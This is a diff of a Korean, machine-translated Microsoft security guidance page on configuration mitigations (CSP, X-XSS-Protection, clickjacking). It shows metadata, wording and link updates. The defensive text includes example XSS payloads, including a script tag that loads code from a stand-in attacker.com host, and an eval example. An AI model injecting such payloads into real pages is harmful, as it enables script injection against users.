@@ -16,12 +16,12 @@ ms.devlang: na
 ms.topic: article
 ms.date: 02/07/2017
 ms.author: jegeib
-ms.openlocfilehash: 3c89fae09583c96cf8139885fe2554cf6784b4e3
-ms.sourcegitcommit: 2ec4b3d0bad7dc0071400c2a2264399e4fe34897
+ms.openlocfilehash: ead6a79109c221d31ead96a202e97294ef218c5f
+ms.sourcegitcommit: acb82fc770128234f2e9222939826e3ade3a2a28
 ms.translationtype: MT
 ms.contentlocale: ko-KR
-ms.lasthandoff: 03/28/2020
-ms.locfileid: "78269833"
+ms.lasthandoff: 04/21/2020
+ms.locfileid: "81687970"
 ---
 # <a name="security-frame-configuration-management--mitigations"></a>보안 프레임: 구성 관리 | 완화 
 | 제품/서비스 | 아티클 |
@@ -33,7 +33,7 @@ ms.locfileid: "78269833"
 | **IoT 필드 게이트웨이** | <ul><li>[비트 사물함으로 OS 및 IoT 필드 게이트웨이의 추가 파티션 암호화](#field-bit-locker)</li><li>[설치 중에 필드 게이트웨이의 기본 로그인 자격 증명이 변경되었는지 확인합니다.](#default-change)</li></ul> |
 | **IoT 클라우드 게이트웨이** | <ul><li>[클라우드 게이트웨이에서 연결된 디바이스 펌웨어를 최신 상태로 유지하는 프로세스를 구현하는지 확인](#cloud-firmware)</li></ul> |
 | **컴퓨터 신뢰 경계** | <ul><li>[장치에 조직 정책에 따라 구성된 엔드 포인트 보안 제어가 있는지 확인](#controls-policies)</li></ul> |
-| **Azure 저장소** | <ul><li>[Azure Storage 액세스 키의 보안 관리 확인](#secure-keys)</li><li>[Azure Storage에서 CORS를 사용하도록 설정하는 경우 신뢰할 수 있는 원본만 허용되는지 확인](#cors-storage)</li></ul> |
+| **Azure Storage** | <ul><li>[Azure Storage 액세스 키의 보안 관리 확인](#secure-keys)</li><li>[Azure Storage에서 CORS를 사용하도록 설정하는 경우 신뢰할 수 있는 원본만 허용되는지 확인](#cors-storage)</li></ul> |
 | **WCF** | <ul><li>[WCF의 서비스 제한 기능을 사용하도록 설정](#throttling)</li><li>[WCF - 메타데이터를 통한 정보 공개](#info-metadata)</li></ul> | 
 
 ## <a name="implement-content-security-policy-csp-and-disable-inline-javascript"></a><a id="csp-js"></a>CSP(콘텐츠 보안 정책)를 구현하고 인라인 JavaScript를 사용하지 않도록 설정
@@ -45,14 +45,14 @@ ms.locfileid: "78269833"
 | **적용 가능한 기술** | 일반 |
 | **특성**              | 해당 없음  |
 | **참조**              | [CPS(콘텐츠 보안 정책) 소개](https://www.html5rocks.com/en/tutorials/security/content-security-policy/)(영문), [콘텐츠 보안 정책 참조](https://content-security-policy.com/)(영문), [보안 기능](https://developer.microsoft.com/microsoft-edge/platform/documentation/dev-guide/security/)(영문), [콘텐츠 보안 정책 소개](https://github.com/webplatform/webplatform.github.io/tree/master/docs/tutorials/content-security-policy)(영문), [CSP를 사용할 수 있습니까?](https://caniuse.com/#feat=contentsecuritypolicy)(영문) |
-| **단계** | <p>CSP(콘텐츠 보안 정책)는 웹 애플리케이션 소유자가 자신의 사이트에 포함된 콘텐츠를 제어할 수 있게 하는 심층 방어 보안 메커니즘인 W3C 표준입니다. CSP는 웹 서버에 HTTP 응답 헤더로 추가되며 브라우저에서 클라이언트 쪽에 적용됩니다. 허용 목록 기반 정책이며, 웹 사이트에서 JavaScript와 같은 액티브 콘텐츠를 로드할 수 있는 트러스트된 도메인 집합을 선언할 수 있습니다.</p><p>CSP는 다음과 같은 보안 이점을 제공합니다.</p><ul><li>**XSS에 대한 보호:** 페이지가 XSS에 취약한 경우 공격자는 다음 두 가지 방법으로 이를 악용할 수 있습니다.<ul><li>`<script>malicious code</script>`를 삽입합니다. 이 악용은 CSP의 기본 제한-1로 인해 작동하지 않습니다.</li><li>`<script src="http://attacker.com/maliciousCode.js"/>`를 삽입합니다. 공격자가 제어하는 도메인은 CSP의 도메인 허용 목록에 없으므로 이 악용은 작동하지 않습니다.</li></ul></li><li>**데이터 유출 제어:** 웹 페이지의 악성 콘텐츠가 외부 웹 사이트에 연결하여 데이터를 도용하려고 하면 CSP에서 연결을 중단합니다. 이는 대상 도메인이 CSP의 허용 목록에 없기 때문입니다.</li><li>**클릭 재킹에 대한 방어:** 클릭 재킹은 대적이 정품 웹 사이트를 구성하고 사용자가 UI 요소를 클릭하도록 강제할 수 있는 공격 기술입니다. 현재 클릭재킹에 대한 방어는 X-Frame-Options 응답 헤더를 구성하여 수행됩니다. 모든 브라우저에서 이 헤더를 사용하지는 않으며, CSP가 클릭재킹을 방어하기 위한 표준 방법이 됩니다.</li><li>**실시간 공격보고:** CSP 지원 웹 사이트에 대한 삽입 공격이 있는 경우 브라우저에서 자동으로 웹 서버에 구성된 엔드포인트로 알림을 트리거합니다. CSP는 이러한 방식으로 실시간 경고 시스템의 역할을 수행합니다.</li></ul> |
+| **단계** | <p>CSP(콘텐츠 보안 정책)는 웹 애플리케이션 소유자가 자신의 사이트에 포함된 콘텐츠를 제어할 수 있게 하는 심층 방어 보안 메커니즘인 W3C 표준입니다. CSP는 웹 서버에 HTTP 응답 헤더로 추가되며 브라우저에서 클라이언트 쪽에 적용됩니다. 허용 목록 기반 정책이며, 웹 사이트에서 JavaScript와 같은 액티브 콘텐츠를 로드할 수 있는 트러스트된 도메인 집합을 선언할 수 있습니다.</p><p>CSP는 다음과 같은 보안 이점을 제공합니다.</p><ul><li>**XSS에 대한 보호:** 페이지가 XSS에 취약한 경우 공격자는 다음 두 가지 방법으로 이를 악용할 수 있습니다.<ul><li>`<script>malicious code</script>`를 삽입합니다. 이 악용은 CSP의 기본 제한-1로 인해 작동하지 않습니다.</li><li>`<script src="http://attacker.com/maliciousCode.js"/>`를 삽입합니다. 공격자가 제어하는 도메인이 CSP의 도메인 화이트리스트에 없기 때문에 이 악용은 작동하지 않습니다.</li></ul></li><li>**데이터 유출 제어:** 웹 페이지의 악성 콘텐츠가 외부 웹 사이트에 연결하여 데이터를 도용하려고 하면 CSP에서 연결을 중단합니다. 대상 도메인이 CSP의 화이트리스트에 포함되지 않기 때문입니다.</li><li>**클릭 재킹에 대한 방어:** 클릭 재킹은 대적이 정품 웹 사이트를 구성하고 사용자가 UI 요소를 클릭하도록 강제할 수 있는 공격 기술입니다. 현재 클릭재킹에 대한 방어는 X-Frame-Options 응답 헤더를 구성하여 수행됩니다. 모든 브라우저에서 이 헤더를 사용하지는 않으며, CSP가 클릭재킹을 방어하기 위한 표준 방법이 됩니다.</li><li>**실시간 공격보고:** CSP 지원 웹 사이트에 대한 삽입 공격이 있는 경우 브라우저에서 자동으로 웹 서버에 구성된 엔드포인트로 알림을 트리거합니다. CSP는 이러한 방식으로 실시간 경고 시스템의 역할을 수행합니다.</li></ul> |
 
 ### <a name="example"></a>예제
 예제 정책: 
 ```csharp
 Content-Security-Policy: default-src 'self'; script-src 'self' www.google-analytics.com 
 ```
-이 정책을 사용하면 웹 애플리케이션 서버 및 Google 분석 서버에서만 스크립트를 로드할 수 있습니다. 다른 사이트에서 로드한 스크립트는 거부됩니다. 웹 사이트에서 CSP를 사용하는 경우 XSS 공격을 완화하기 위해 다음 기능들이 자동으로 비활성화됩니다. 
+이 정책을 사용하면 스크립트가 웹 응용 프로그램의 서버 및 Google 분석 서버에서만 로드할 수 있습니다. 다른 사이트에서 로드한 스크립트는 거부됩니다. 웹 사이트에서 CSP를 사용하는 경우 XSS 공격을 완화하기 위해 다음 기능들이 자동으로 비활성화됩니다. 
 
 ### <a name="example"></a>예제
 인라인 스크립트가 실행되지 않습니다. 다음은 인라인 스크립트의 예제입니다. 
@@ -76,7 +76,7 @@ Example: var str="alert(1)"; eval(str);
 | **SDL 단계**               | 빌드 |  
 | **적용 가능한 기술** | 일반 |
 | **특성**              | 해당 없음  |
-| **참조**              | [XSS 보호 필터](https://www.owasp.org/index.php/List_of_useful_HTTP_headers#X-XSS-Protection)(영문) |
+| **참조**              | [XSS 보호 필터](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)(영문) |
 | **단계** | <p>X-XSS-Protection 응답 헤더 구성은 브라우저의 사이트 간 스크립트 필터를 제어합니다. 이 응답 헤더의 값은 다음과 같습니다.</p><ul><li>`0:` - 필터를 비활성화합니다.</li><li>`1: Filter enabled` - 사이트 간 스크립팅 공격이 감지되면 공격을 중지하도록 브라우저에서 페이지를 삭제합니다.</li><li>`1: mode=block : Filter enabled`. XSS 공격이 감지되면 브라우저에서 페이지를 삭제하는 대신 페이지의 렌더링을 방해합니다.</li><li>`1: report=http://[YOURDOMAIN]/your_report_URI : Filter enabled`. 브라우저에서 페이지를 삭제하고 위반을 보고합니다.</li></ul><p>이는 CSP 위반 보고서를 활용하여 선택한 URI에 세부 정보를 보내는 Chromium 함수입니다. 마지막 두 옵션은 안전한 값으로 간주됩니다.</p>|
 
 ## <a name="aspnet-applications-must-disable-tracing-and-debugging-prior-to-deployment"></a><a id="trace-deploy"></a>ASP.NET 애플리케이션에서 배포 전에 추적 및 디버깅을 사용하지 않도록 설정
@@ -109,7 +109,7 @@ Example: var str="alert(1)"; eval(str);
 | **SDL 단계**               | 빌드 |  
 | **적용 가능한 기술** | 일반 |
 | **특성**              | 해당 없음  |
-| **참조**              | [OWASP 클릭 재킹 방어 치트 시트,](https://www.owasp.org/index.php/Clickjacking_Defense_Cheat_Sheet) [IE 내부 - X 프레임 옵션으로 클릭 재킹 퇴치](https://blogs.msdn.microsoft.com/ieinternals/2010/03/30/combating-clickjacking-with-x-frame-options/) |
+| **참조**              | [OWASP 클릭 재킹 방어 치트 시트,](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html) [IE 내부 - X 프레임 옵션으로 클릭 재킹 퇴치](https://blogs.msdn.microsoft.com/ieinternals/2010/03/30/combating-clickjacking-with-x-frame-options/) |
 | **단계** | <p>"UI 변조 공격"이라고도 하는 클릭재킹은 공격자가 여러 투명 레이어 또는 불투명 레이어를 사용하여 사용자가 최상위 수준 페이지를 클릭하려고 할 때 다른 페이지의 단추 또는 링크를 클릭하도록 속이는 경우입니다.</p><p>이러한 레이어는 iframe을 포함한 악의적인 페이지를 만들어 공격 대상 사용자의 페이지를 로드함으로써 수행됩니다. 따라서 공격자는 자신의 페이지에 대한 클릭을 "하이재킹"하고 다른 애플리케이션, 도메인 또는 둘 모두가 소유하는 다른 페이지로 라우팅합니다. 클릭재킹 공격을 방지하려면 적절한 X-Frame-Options HTTP 응답 헤더를 설정하여 다른 도메인의 프레이밍을 허용하지 않도록 브라우저에 지시합니다.</p>|
 
 ### <a name="example"></a>예제
